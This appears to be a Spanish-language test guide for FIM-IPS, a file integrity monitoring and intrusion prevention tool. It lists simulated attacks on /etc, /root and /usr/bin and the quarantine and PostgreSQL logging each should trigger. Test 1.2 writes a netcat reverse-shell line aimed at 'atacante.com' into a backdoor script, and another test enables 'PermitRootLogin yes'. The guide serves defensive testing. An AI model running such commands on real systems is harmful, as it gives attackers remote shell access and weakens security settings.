# 🧪 Guía de Pruebas y Validación Forense (Testing)

Este documento detalla la batería de pruebas (Test Cases) diseñada para validar el correcto funcionamiento de la arquitectura **FIM-IPS**. Los escenarios cubren las tácticas más comunes descritas en el framework MITRE ATT&CK, incluyendo persistencia, evasión de defensas y escalada de privilegios.

## ⚙️ Pre-requisitos

Antes de ejecutar las pruebas, asegurar que el entorno esté operativo:

1. El servicio debe estar corriendo: `sudo systemctl status fim_monitor`
2. El directorio de cuarentena debe existir con permisos nulos: `sudo ls -ld /cuarentena` (Debe mostrar `d---------`)

---

## 🛡️ Categoría 1: Prevención de Intrusiones (Inyección de Código)

Verifica que el motor IPS detecte creaciones no autorizadas en las zonas críticas y las aísle en milisegundos.

### Test 1.1: Inyección en configuraciones globales (/etc)

Simula la creación de un archivo de configuración malicioso para alterar el comportamiento del sistema.

- Comando:
  $ echo "Payload malicioso" | sudo tee /etc/hack.conf

- Resultado Esperado:
  - Físico: El archivo desaparece de /etc y es confinado en /cuarentena/hack.conf\_[TIMESTAMP].infectado.
  - Forense: Eventos CREADO y MODIFICADO registrados en PostgreSQL.

### Test 1.2: Infiltración en el directorio del administrador (/root)

Simula la instalación de un backdoor o Reverse Shell en la carpeta privada del superusuario.

- Comando:
  $ echo "nc -e /bin/bash atacante.com 4444" | sudo tee /root/backdoor.sh

- Resultado Esperado:
  Aislamiento inmediato. El atacante pierde acceso al script antes de poder otorgarle permisos de ejecución.

### Test 1.3: Falsificación de binarios del sistema (/usr/bin)

Simula el reemplazo o adición de un comando ejecutable falso (Ej. un comando ls modificado).

- Comando:
  $ echo "Soy un binario troyanizado" | sudo tee /usr/bin/falso_comando

- Resultado Esperado:
  El IPS intercepta el binario falso en la ruta /usr/bin, protegiendo la integridad de las herramientas del sistema operativo.

---

## 🕵️‍♂️ Categoría 2: Alteración de Metadatos y Permisos

Verifica la capacidad de la herramienta para extraer atributos a bajo nivel mediante la biblioteca os.stat y pwd.

### Test 2.1: Escalada de Privilegios (Modificación de máscara octal)

Simula un atacante otorgando permisos de ejecución, lectura y escritura a cualquier usuario.

- Comandos:
  $ sudo touch /etc/test_permisos.txt
  $ sudo chmod 777 /etc/test_permisos.txt

- Resultado Esperado:
  La base de datos registra el evento y en la columna permisos captura la vulnerabilidad crítica indicando el valor 777.

### Test 2.2: Secuestro de Propiedad (Ownership Hijacking)

Simula un atacante cambiando el dueño legítimo de un archivo para evadir restricciones de lectura.

- Comandos:
  $ sudo touch /etc/test_dueño.txt
  $ sudo chown tu_usuario:tu_usuario /etc/test_dueño.txt

- Resultado Esperado:
  El sistema traduce el UID a bajo nivel y la columna propietario en PostgreSQL refleja el nombre del usuario secuestrador en lugar de root.

---

## 📝 Categoría 3: Integridad de Contenido y Evasión

Verifica la funcionalidad del motor diferencial en memoria RAM y la respuesta ante intentos de ocultamiento.

### Test 3.1: Captura Diferencial (Diffs) de texto

Simula la inyección de una línea maliciosa dentro de un archivo de configuración pre-existente y legítimo.

- Comandos:
  $ sudo touch /etc/archivo_legitimo.conf
  $ sleep 2
  $ echo "PermitRootLogin yes" | sudo tee -a /etc/archivo_legitimo.conf

- Resultado Esperado:
  El IPS aísla el archivo. La base de datos registra el evento MODIFICADO y la columna detalles_diff contiene explícitamente el texto +PermitRootLogin yes.

### Test 3.2: Evasión mediante Renombrado (Movimiento lateral)

Simula un atacante intentando ocultar un malware cambiándole el nombre o moviéndolo a una subcarpeta.

- Comandos:
  $ sudo touch /etc/virus_evasivo.txt
  $ sudo mv /etc/virus_evasivo.txt /etc/oculto.txt

- Resultado Esperado:
  El manejador on_moved de Watchdog intercepta la acción. Se registra el cambio de ruta manteniendo la trazabilidad del archivo.

### Test 3.3: Borrado de Huellas (Eliminación)

Simula un atacante eliminando archivos de logs o configuraciones para no dejar rastro.

- Comandos:
  $ sudo rm /etc/archivo_legitimo.conf

- Resultado Esperado:
  Al desaparecer físicamente, el sistema dispara el evento ELIMINADO. Los hashes criptográficos se guardan como NULL o None, alertando sobre la ausencia del recurso crítico.

---

## 🔍 Comprobación Forense Global

Para auditar los resultados de toda la batería de pruebas, ejecutar la siguiente consulta SQL en PostgreSQL o visualizar el Dashboard en Grafana:

SELECT
fecha_registro,
evento,
nombre_archivo,
ruta_completa,
propietario,
permisos,
detalles_diff
FROM registros_archivos
WHERE evento != 'BASELINE'
ORDER BY fecha_registro DESC
LIMIT 20;

(Esta consulta excluirá el ruido de la carga inicial y mostrará cronológicamente la radiografía exacta de todos los ataques mitigados).
